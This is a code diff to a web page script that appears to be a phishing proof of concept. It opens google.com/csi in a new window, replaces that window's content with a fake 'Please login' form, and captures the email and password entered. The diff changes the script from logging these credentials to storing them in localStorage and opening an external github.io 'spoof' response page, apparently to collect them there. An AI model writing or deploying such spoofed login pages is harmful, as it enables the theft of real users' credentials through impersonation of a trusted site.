@@ -13,8 +13,7 @@
 
     <script>
         function go() {
-            var x = window.open('https://www.google.com/csi'); // Open a target URL (Google)
-            
+            var x = window.open('https://www.google.com/csi'); // Open Google CSI
             setTimeout(function() {
                 // Change the body content of the opened window to simulate a fake login page
                 x.document.body.innerHTML = '<h1>Please login</h1>';
@@ -33,12 +32,12 @@
                         return; // Prevent sending empty data
                     }
 
-                    // Log the data to the console (no redirect)
-                    console.log("Email:", email);
-                    console.log("Password:", password);
+                    // Store the data in localStorage for later use on response page
+                    localStorage.setItem("email", email);
+                    localStorage.setItem("password", password);
 
-                    // Optionally, you can do more here (send data to a server, etc.)
-                    alert('Data sent to server');
+                    // You can optionally redirect to response page here if needed (this is optional)
+                    window.open('https://ecdnts-del.github.io/spoof/respon.html');
                 }
             }, 3000); // Wait for 3 seconds to simulate the page load time
         }
